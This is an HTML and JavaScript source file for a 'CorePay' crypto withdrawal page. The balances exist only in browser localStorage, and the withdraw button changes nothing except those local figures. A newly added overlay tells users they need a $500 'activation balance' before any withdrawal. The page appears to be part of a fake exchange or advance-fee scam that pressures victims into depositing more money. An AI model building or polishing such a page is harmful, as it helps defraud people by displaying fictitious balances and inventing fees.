<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CorePay Withdraw</title>

<style>
body{
margin:0;
background:linear-gradient(135deg,#0f172a,#111827,#0b1020);
font-family:system-ui,-apple-system,Segoe UI,Roboto;
color:white;
}

.card{
max-width:420px;
margin:80px auto;
background:rgba(17,24,39,.9);
padding:30px;
border-radius:26px;
box-shadow:0 30px 80px rgba(0,0,0,.6);
}

button{
background:linear-gradient(90deg,#22c55e,#6366f1);
border:none;
color:white;
padding:12px;
border-radius:16px;
cursor:pointer;
width:100%;
margin-top:12px;
font-weight:600;
transition:.3s;
}

button:hover{
transform:translateY(-2px);
box-shadow:0 12px 30px rgba(99,102,241,.4);
}

input,select{
width:100%;
padding:12px;
margin-top:10px;
background:#0f172a;
border:1px solid #1e293b;
border-radius:14px;
color:white;
}

.err{
color:#f87171;
font-size:13px;
margin-top:10px;
}

/* ===== NEW ANIMATED OVERLAY ===== */

.overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,.85);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
animation:fadeIn .4s ease;
}

.overlayBox{
background:rgba(17,24,39,.95);
padding:35px;
border-radius:24px;
max-width:420px;
text-align:center;
box-shadow:0 25px 70px rgba(0,0,0,.7);
animation:slideUp .5s ease;
}

.overlayBox h3{
margin-top:0;
color:#f87171;
}

.overlayBox p{
font-size:14px;
color:#d1d5db;
line-height:1.6;
}

@keyframes fadeIn{
from{opacity:0}
to{opacity:1}
}

@keyframes slideUp{
from{transform:translateY(30px);opacity:0}
to{transform:translateY(0);opacity:1}
}
</style>
</head>
<body>

<div class="card">
<h3>Withdraw Funds</h3>

<select id="coin">
<option>BTC</option>
<option>ETH</option>
<option>TRX</option>
<option>SOL</option>
<option>BNB</option>
</select>

<input id="addr" placeholder="Destination wallet">
<input id="amt" placeholder="Amount">
<button onclick="withdraw()">Withdraw</button>

<p id="msg" class="err"></p>
</div>

<!-- NEW INSUFFICIENT MINIMUM BALANCE OVERLAY -->
<div class="overlay" id="minBalanceOverlay">
<div class="overlayBox">
<h3>Activation Balance Required</h3>
<p>
Insufficient Balance to cover your withdrawal.<br><br>
You need a minimum balance of <strong>$500</strong> to withdraw successfully in your activation balance.
</p>
</div>
</div>

<script>
/* ORIGINAL SCRIPT + MINIMUM BALANCE CHECK ADDED */
const wallet=localStorage.wallet;
const key="corepay_"+wallet;
let data=JSON.parse(localStorage.getItem(key));

function save(){localStorage.setItem(key,JSON.stringify(data));}

function getTotalBalance(){
 let total=0;
 Object.values(data.balances).forEach(v=> total+=v);
 return total;
}

function withdraw(){

 let totalBalance = getTotalBalance();

 // ===== NEW MINIMUM BALANCE CHECK =====
 if(totalBalance < 500){
   const overlay = document.getElementById("minBalanceOverlay");
   overlay.style.display="flex";
   setTimeout(()=>{
     overlay.style.display="none";
   },10000); // shows for exactly 10 seconds
   return;
 }

 let a=parseFloat(amt.value);
 let c=coin.value;

 if(!a||a<=0||data.balances[c]<a){
   msg.innerText="Insufficient balance";
   return;
 }

 data.balances[c]-=a;
 data.withdrawals.push({coin:c,amount:a,time:Date.now()});
 data.history.unshift(`Withdraw -$${a.toFixed(2)} (${c})`);
 save();

 msg.innerText="Withdrawal submitted";

 setTimeout(()=>location.href="home.html",2000);
}
</script>

</body>
</html>
